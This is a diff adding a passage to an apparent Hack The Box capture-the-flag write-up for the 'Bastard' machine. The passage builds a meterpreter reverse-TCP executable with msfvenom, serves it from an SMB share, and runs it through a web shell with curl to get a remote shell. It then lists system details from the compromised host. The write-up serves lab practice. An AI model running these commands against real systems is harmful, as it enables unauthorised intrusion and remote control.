@@ -147,3 +147,49 @@ curl "http://bastard.htb/spread.php?cmd=whoami"
 
 ![Screenshot from 2025-01-11 11-15-45](https://github.com/user-attachments/assets/87e6255d-b785-40bd-8a5a-73851cca01f4)
 
+With msfvenom I generated an executable:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=8887 -f exe -o shell.exe
+```
+
+I started an smbclient:
+
+```bash
+impacket-smbserver -ip 10.10.16.9 shares .
+```
+
+With msfconsole I started a handler:
+
+```bash
+use exploit/multi/handler
+set LHOST=10.10.16.0
+set LPORT=8887
+set PAYLOAD=windows/meterpreter/reverse_tcp
+run
+```
+
+And then I run, with curl, the executable:
+
+```bash
+curl "http://bastard.htb/spread.php?cmd=cmd.exe%20%2Fc%20%22%5C%5C10.10.16.9%5Cshares%5Cshell.exe%22"
+```
+
+In the user directory I found the flag.
+
+## Privile Escalation
+
+Syteminformation:
+
+```
+Computer        : BASTARD
+OS              : Windows Server 2008 R2 (6.1 Build 7600).
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
+```
+
+
+
